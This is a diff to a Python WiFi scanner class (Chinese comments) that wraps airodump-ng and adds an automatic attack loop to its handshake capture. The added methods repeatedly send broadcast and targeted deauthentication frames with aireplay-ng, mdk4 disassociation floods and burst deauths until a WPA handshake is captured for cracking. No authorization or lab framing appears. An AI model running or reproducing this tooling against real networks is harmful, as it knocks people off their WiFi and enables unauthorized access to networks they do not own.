@@ -1,29 +1,31 @@
 #!/usr/bin/env python3
-"""WiFi Scanner - 封装 airodump-ng 扫描功能"""
+"""WiFi Scanner - 封装 airodump-ng 扫描功能（优化版）"""
 
 import subprocess
 import os
-import csv
 import json
 import time
-import signal
 import threading
 from datetime import datetime
 from pathlib import Path
 
 class WiFiScanner:
-    def __init__(self, capture_dir="/home/vagrant/captures"):
+    def __init__(self, capture_dir="/opt/wifi-capture/captures"):
         self.capture_dir = Path(capture_dir)
         self.capture_dir.mkdir(parents=True, exist_ok=True)
         self.interface = None
         self.mon_interface = None
         self.scan_process = None
         self.capture_process = None
+        self.attack_process = None
         self.is_scanning = False
         self.is_capturing = False
         self.current_target = None
-        self.networks = []
+        self.networks = []  # 持久化网络列表
+        self.networks_cache = {}  # 用于合并去重
         self.scan_file = None
+        self.attack_thread = None
+        self.attack_running = False
         
     def find_interface(self):
         """查找无线网卡"""
@@ -123,8 +125,10 @@ class WiFiScanner:
         self._parse_scan_results()
     
     def _parse_scan_results(self):
-        """解析扫描结果"""
-        self.networks = []
+        """解析扫描结果 - 合并而不是清空"""
+        if not self.scan_file:
+            return
+            
         csv_file = f"{self.scan_file}-01.csv"
         
         if not os.path.exists(csv_file):
@@ -135,7 +139,9 @@ class WiFiScanner:
                 content = f.read()
             
             # 分割 AP 和客户端部分
-            parts = content.split('\r\n\r\n')
+            parts = content.split('\n\n')
+            if not parts:
+                parts = content.split('\r\n\r\n')
             if not parts:
                 return
             
@@ -145,7 +151,7 @@ class WiFiScanner:
             for line in lines[2:]:  # 跳过标题行
                 fields = line.split(',')
                 if len(fields) >= 14:
-                    bssid = fields[0].strip()
+                    bssid = fields[0].strip().upper()
                     if not bssid or ':' not in bssid:
                         continue
                     
@@ -159,21 +165,31 @@ class WiFiScanner:
                     if channel <= 0 or channel > 165:
                         continue
                     
+                    essid = fields[13].strip() if len(fields) > 13 else '<Hidden>'
+                    if essid == '':
+                        essid = '<Hidden>'
+                    
                     network = {
-                        'bssid': bssid.upper(),
+                        'bssid': bssid,
                         'channel': channel,
                         'power': power,
                         'encryption': fields[5].strip() if len(fields) > 5 else '',
                         'cipher': fields[6].strip() if len(fields) > 6 else '',
                         'auth': fields[7].strip() if len(fields) > 7 else '',
-                        'essid': fields[13].strip() if len(fields) > 13 else '<Hidden>',
-                        'clients': 0
+                        'essid': essid,
+                        'clients': 0,
+                        'last_seen': time.time()
                     }
                     
-                    if network['essid'] == '':
-                        network['essid'] = '<Hidden>'
-                    
-                    self.networks.append(network)
+                    # 合并到缓存，更新已有网络的信号强度
+                    self.networks_cache[bssid] = network
+            
+            # 从缓存重建网络列表，过滤太旧的（60秒未见）
+            current_time = time.time()
+            self.networks = [
+                net for net in self.networks_cache.values()
+                if current_time - net.get('last_seen', 0) < 60
+            ]
             
             # 按信号强度排序
             self.networks.sort(key=lambda x: x['power'], reverse=True)
@@ -188,7 +204,7 @@ class WiFiScanner:
         return self.networks
     
     def start_capture(self, bssid, channel, essid):
-        """开始捕获握手包"""
+        """开始捕获握手包 - 带自动攻击"""
         if self.is_capturing:
             return False
         
@@ -197,23 +213,26 @@ class WiFiScanner:
                 return False
         
         self.is_capturing = True
+        self.attack_running = True
         self.current_target = {
             'bssid': bssid,
             'channel': channel,
             'essid': essid,
             'start_time': datetime.now().isoformat(),
             'status': 'capturing',
-            'handshake': False
+            'handshake': False,
+            'attack_type': 'none',
+            'attack_count': 0
         }
         
-        safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")
+        safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-") or "hidden"
         capture_file = self.capture_dir / f"handshake_{safe_essid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
         self.current_target['file'] = str(capture_file)
         
         def capture_thread():
             try:
                 # 锁定信道
-                subprocess.run(["iwconfig", self.mon_interface, "channel", str(channel)],
+                subprocess.run(["iw", "dev", self.mon_interface, "set", "channel", str(channel)],
                              capture_output=True, timeout=5)
                 
                 self.capture_process = subprocess.Popen(
@@ -227,10 +246,18 @@ class WiFiScanner:
                     stderr=subprocess.DEVNULL
                 )
                 
+                # 启动自动攻击线程
+                self.attack_thread = threading.Thread(
+                    target=self._auto_attack_loop,
+                    args=(bssid, channel),
+                    daemon=True
+                )
+                self.attack_thread.start()
+                
                 # 监控握手包
+                cap_file = f"{capture_file}-01.cap"
                 while self.is_capturing:
-                    time.sleep(5)
-                    cap_file = f"{capture_file}-01.cap"
+                    time.sleep(3)
                     if os.path.exists(cap_file):
                         result = subprocess.run(
                             ["aircrack-ng", cap_file],
@@ -241,26 +268,152 @@ class WiFiScanner:
                         if "1 handshake" in result.stdout:
                             self.current_target['handshake'] = True
                             self.current_target['status'] = 'success'
+                            self.attack_running = False
+                            print(f"[+] 捕获到握手包: {essid}")
                             break
                             
             except Exception as e:
                 print(f"Capture error: {e}")
-                self.current_target['status'] = 'error'
+                if self.current_target:
+                    self.current_target['status'] = 'error'
             finally:
-                self.stop_capture()
+                self.attack_running = False
+                self._stop_attack()
         
         thread = threading.Thread(target=capture_thread, daemon=True)
         thread.start()
         return True
     
+    def _auto_attack_loop(self, bssid, channel):
+        """自动攻击循环 - 尝试多种攻击方式"""
+        attack_methods = [
+            ('deauth_broadcast', self._attack_deauth_broadcast),
+            ('deauth_targeted', self._attack_deauth_targeted),
+            ('disassoc', self._attack_disassoc),
+            ('deauth_burst', self._attack_deauth_burst),
+        ]
+        
+        round_num = 0
+        while self.attack_running and self.is_capturing:
+            round_num += 1
+            
+            for attack_name, attack_func in attack_methods:
+                if not self.attack_running or not self.is_capturing:
+                    break
+                
+                if self.current_target:
+                    self.current_target['attack_type'] = attack_name
+                    self.current_target['attack_count'] = round_num
+                
+                self._current_attack_type = attack_name
+                self._attack_count = round_num
+                
+                print(f"[*] 第{round_num}轮 攻击方式: {attack_name}")
+                try:
+                    attack_func(bssid, channel)
+                except Exception as e:
+                    print(f"Attack error ({attack_name}): {e}")
+                
+                # 每次攻击后等待
+                for _ in range(10):  # 等待 10 秒
+                    if not self.attack_running:
+                        break
+                    time.sleep(1)
+    
+    def _attack_deauth_broadcast(self, bssid, channel):
+        """广播 Deauth 攻击 - 断开所有客户端"""
+        subprocess.run(
+            ["aireplay-ng", "--deauth", "10", "-a", bssid, self.mon_interface],
+            capture_output=True, timeout=30
+        )
+    
+    def _attack_deauth_targeted(self, bssid, channel):
+        """针对性 Deauth - 攻击已连接的客户端"""
+        # 获取客户端列表
+        clients = self._get_connected_clients(bssid)
+        for client in clients[:3]:  # 最多攻击 3 个客户端
+            if not self.attack_running:
+                break
+            subprocess.run(
+                ["aireplay-ng", "--deauth", "5", "-a", bssid, "-c", client, self.mon_interface],
+                capture_output=True, timeout=15
+            )
+            time.sleep(1)
+    
+    def _attack_disassoc(self, bssid, channel):
+        """发送 Disassociation 帧"""
+        # 使用 mdk3/mdk4 或回退到 deauth
+        try:
+            subprocess.run(
+                ["mdk4", self.mon_interface, "d", "-B", bssid, "-c", str(channel)],
+                capture_output=True, timeout=10
+            )
+        except:
+            # 回退到 deauth
+            subprocess.run(
+                ["aireplay-ng", "--deauth", "15", "-a", bssid, self.mon_interface],
+                capture_output=True, timeout=30
+            )
+    
+    def _attack_deauth_burst(self, bssid, channel):
+        """爆发式 Deauth - 大量发送"""
+        for _ in range(3):
+            if not self.attack_running:
+                break
+            subprocess.Popen(
+                ["aireplay-ng", "--deauth", "20", "-a", bssid, self.mon_interface],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            time.sleep(2)
+    
+    def _get_connected_clients(self, bssid):
+        """获取连接到指定 AP 的客户端"""
+        clients = []
+        try:
+            # 从捕获文件中解析客户端
+            if self.current_target and 'file' in self.current_target:
+                csv_file = f"{self.current_target['file']}-01.csv"
+                if os.path.exists(csv_file):
+                    with open(csv_file, 'r', errors='ignore') as f:
+                        content = f.read()
+                    # 查找客户端部分
+                    parts = content.split('Station MAC')
+                    if len(parts) > 1:
+                        for line in parts[1].split('\n')[1:]:
+                            fields = line.split(',')
+                            if len(fields) >= 6:
+                                client_mac = fields[0].strip()
+                                ap_mac = fields[5].strip()
+                                if ap_mac.upper() == bssid.upper() and ':' in client_mac:
+                                    clients.append(client_mac)
+        except:
+            pass
+        return clients
+    
+    def _stop_attack(self):
+        """停止攻击进程"""
+        self.attack_running = False
+        # 杀死可能的 aireplay-ng 进程
+        try:
+            subprocess.run(["pkill", "-f", "aireplay-ng"], capture_output=True, timeout=5)
+        except:
+            pass
+    
     def stop_capture(self):
         """停止捕获"""
+        self.attack_running = False
+        self._stop_attack()
+        
         if self.capture_process:
             try:
                 self.capture_process.terminate()
                 self.capture_process.wait(timeout=5)
             except:
-                self.capture_process.kill()
+                try:
+                    self.capture_process.kill()
+                except:
+                    pass
             self.capture_process = None
         
         if self.current_target and self.current_target['status'] == 'capturing':
@@ -319,7 +472,10 @@ class WiFiScanner:
             'is_scanning': self.is_scanning,
             'is_capturing': self.is_capturing,
             'current_target': self.current_target,
-            'network_count': len(self.networks)
+            'network_count': len(self.networks),
+            'attack_running': self.attack_running,
+            'attack_type': getattr(self, '_current_attack_type', None),
+            'attack_count': getattr(self, '_attack_count', 0)
         }
     
     def cleanup(self):
